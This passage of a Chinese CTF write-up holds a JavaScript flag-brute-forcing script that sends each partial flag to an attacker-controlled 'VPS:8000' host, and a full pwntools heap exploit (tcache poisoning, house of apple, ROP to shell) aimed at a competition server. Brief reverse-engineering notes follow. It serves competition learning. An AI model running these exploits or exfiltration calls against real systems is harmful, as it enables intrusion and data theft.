punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n                script<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onerror</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n                    document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span><span class=\"token function\">removeChild</span><span class=\"token punctuation\">(</span>script<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n                document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>script<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">bruteforce</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>currentFlag<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#125;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> char <span class=\"token keyword\">of</span> chars<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token keyword\">const</span> isCorrect <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">checkCharacter</span><span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>isCorrect<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                            currentFlag <span class=\"token operator\">+=</span> char<span class=\"token punctuation\">;</span>\n                            window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">http://VPS:8000/?flag=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>currentFlag<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                            <span class=\"token keyword\">await</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token punctuation\">&#125;</span>\n                        <span class=\"token keyword\">await</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">http://VPS:8000/?error=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>currentFlag<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token function\">bruteforce</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n\n<p>VPS起这个服务，bot访问即可</p>\n<p><img src=\"/images/1742736741383-899b4fa3-fb61-4084-8d13-d712ca7d9aa2.png\" loading=\"lazy\"></p>\n<h2 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h2><h3 id=\"unauth-diary\"><a href=\"#unauth-diary\" class=\"headerlink\" title=\"unauth-diary\"></a>unauth-diary</h3><p>先创造largebin来泄漏libc和堆地址，之后创造一个大小为-1的堆块，这样可以溢出来打tcache poisioning。用stdout结构体打house of apple来调用setcontext来写rop。rop用dup2来改输入输出的fd，这样就能拿到shell了。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"\")</span>\n<span class=\"token comment\">#io=remote(\"localhost\",9999)</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"39.106.16.204\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33245</span><span class=\"token punctuation\">)</span>\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">view</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    free<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x200</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n\nview<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x203b00</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span>\n\nview<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nheap<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x1200</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\\0\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#7</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nfree<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\nfree<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\n\nstdout<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x2045c0</span>\nio_list_all<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x2044c0</span>\ntarget<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>io_list_all<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0x1060</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token number\">12</span>\ntarget1<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0x1080</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token number\">12</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>\np<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>target1<span class=\"token punctuation\">)</span>\n\nfake_io_addr<span class=\"token operator\">=</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0xd20</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>fake_io_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nsystem<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x58750</span>\nenviron<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x20ad58</span>\n_IO_wfile_jumps<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x202228</span>\nsetcontext<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x4a99d</span>\n\nrop_addr<span class=\"token operator\">=</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0x850</span>\nrax<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0xdd237</span>\nrdi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x158748</span>\nrsi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x02b46b</span>\nsyscall<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x127185</span><span class=\"token operator\">+</span><span class=\"token number\">4</span>\nrsp<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x5ef6f</span>\nrdx<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x162e3a</span>\n\nrop<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>rax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">5</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">5</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x3b</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0xd20</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">5</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0x978</span><span class=\"token operator\">+</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0x978</span><span class=\"token operator\">+</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> rop<span class=\"token punctuation\">)</span>\n\nfake_io <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x0</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\" sh;\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>setcontext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x88</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>rop_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># _lock</span>\n    <span class=\"token number\">0xa0</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xa8</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>rsp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xd8</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>_IO_wfile_jumps <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xe0</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> filler<span class=\"token operator\">=</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span>\n\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">,</span> fake_io<span class=\"token punctuation\">)</span>\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n\n\n<h2 id=\"RE\"><a href=\"#RE\" class=\"headerlink\" title=\"RE\"></a>RE</h2><h3 id=\"ezDOS\"><a href=\"#ezDOS\" class=\"headerlink\" title=\"ezDOS\"></a>ezDOS</h3><p>程序中间出现的花指令都直接nop去除，然后Apply patch到程序。</p>\n<p><img src=\"/images/1742731823755-b823cf34-aab4-4fbe-bf7e-f53a4aaa3497.png\" loading=\"lazy\"></p>\n<p>程序要求输入38长度字符串，然后进行一系列变种类RC4算法加密，然后与0x141地址的38字节数据进行比对。</p>\n<p><img src=\"/images/1742732096513-faa2f920-70f8-4a36-93df-91f224f7c6d0.png\" loading=\"lazy\"></p>\n<p>使用dosbox动调，在FA代码处是对取出的al对输入的字符串进行xor加密。0x32是取出的异或值，0x31是输入的字符’1’。</p>\n<p><img src=\"/images/1742732287881-3999c9b7-5e31-4121-9f55-e2b906e10ccd.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/1742732249120-5fda8d14-cb9b-4f49-8bf6-614e6960dc63.png\" loading=\"lazy\"></p>\n<p>直接debug一直循环执行这边，即可拿到对输入字符串异或的一系列异或值。</p>\n<blockquote>\n<p>32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1</p>\n</blockquote>\n<p>取出0x142地址的38字节，进行异或即可得到解密flag。</p>\n<p><img src=\"/images/1742732520225-ea38e755-4155-4ff4-b845-9fd37b9bcc95.png\" loading=\"lazy\"></p>\n<h3 id=\"SafeProgram\"><a href=\"#SafeProgram\" class=\"headerlink\" title=\"SafeProgram\"></a>SafeProgram</h3><p>核心加密是一个SM4加密。</p>\n<p><img src=\"/images/1742733064140-f984f029-5c19-40da-96a2-7c9933518e4b.png\" loading=\"lazy\"></p>\n<p>查看byte_14002A0D0数组交叉引用，发现在其他函数被访问过。</p>\n<p><img src=\"/images/1742733138431-04584683-08b6-44f7-a471-1549be8e206e.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/1742733148877-755426b6-0cd4-4c98-86b0-49efafd7b7e6.png\" loading=\"lazy\"></p>\n<p>发现是在VEH异常Handler里面调用的，第一个AddVectoredExceptionHandler得直接nop，不然运行就直接退出。</p>\n<p><img src=\"/images/1742733208272-ce5e8263-86f4-4503-8a09-968a5e694740.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/1742733215267-dd1e9a92-33aa-4250-a846-4191f12379b8.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/1742733314872-bc3290b8-a385-47a3-965d-5477921a25a5.png\" loading=\"lazy\"></p>\n<p>然后在这个函数开头断点，使用ScyllaHide插件一键去除反调试，防止其他地方的反调试。</p>\n<p><img src=\"/images/1742733356084-873e99b1-43f0-4c23-9c16-33ce6afc2a5b.png\" loading=\"lazy\"></p>\n<p>main函数可以看到要求输入格式为NCTF{…}的长度38字符串，然后运行到箭头函数会触发除0异常，然后就会触发VEH那个Handler导致那个byte数组被修改，需要提取的数据是被改后的。</p>\n<p><img src=\"/images/1742733443971-e0cf12c7-c12a-48b3-b557-7ff20d700ec6.png\" loading=\"lazy\"></p>\n<p>动调时提取这三个数组数据，进行解密即可。</p>\n<p><img src=\"/images/1742733627618-776e5556-677d-4108-957a-8081f3a182ad.png\" 